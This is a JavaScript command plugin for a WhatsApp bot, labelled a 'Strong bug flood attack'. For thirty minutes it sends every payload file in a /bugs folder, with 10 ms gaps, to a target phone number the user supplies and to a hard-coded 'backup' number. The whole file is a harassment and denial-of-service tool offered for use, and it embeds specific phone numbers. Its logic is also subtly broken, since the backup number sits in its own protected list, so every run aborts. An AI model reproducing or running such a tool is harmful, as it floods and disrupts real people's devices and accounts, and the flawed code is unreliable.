const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'dawens-xy',
  desc: 'Strong bug flood attack with backup number',
  category: 'bug',
  react: '🔥',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.text || m.body || '';
    const args = body.trim().split(/\s+/).slice(1);

    if (args.length === 0) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}dawens-xy <number>`
      }, { quoted: mek });
    }

    const targetNumber = args[0].replace(/\D/g, '');
    const backupNumber = '13058962443';
    const protectedNumbers = [
      '13058962443',
      '50942241547'
    ];

    const senderJid = mek.sender?.split(':')[0]?.replace(/\D/g, '');

    if (isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Invalid number. Usage:\n${prefix}dawens-xy <number>`
      }, { quoted: mek });
    }

    if (
      protectedNumbers.includes(targetNumber) ||
      protectedNumbers.includes(backupNumber) ||
      protectedNumbers.includes(senderJid) ||
      senderJid === targetNumber
    ) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Flood aborted.'
      }, { quoted: mek });
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📁 No payloads found in /bugs folder.'
      }, { quoted: mek });
    }

    // Notify start
    await bot.sendMessage(from, {
      text: `⚡ Starting strong bug flood on *${targetNumber}* and backup number *${backupNumber}*...`
    }, { quoted: mek });

    const endTime = Date.now() + (30 * 60 * 1000); // 30 minutes

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, targetNumber);
            await bugPayload(bot, backupNumber);
          }
        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }
        await new Promise(res => setTimeout(res, 10)); // small delay
      }
    }

    await bot.sendMessage(from, {
      text: `✅ Bug flood completed on *${targetNumber}* and backup number *${backupNumber}*`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});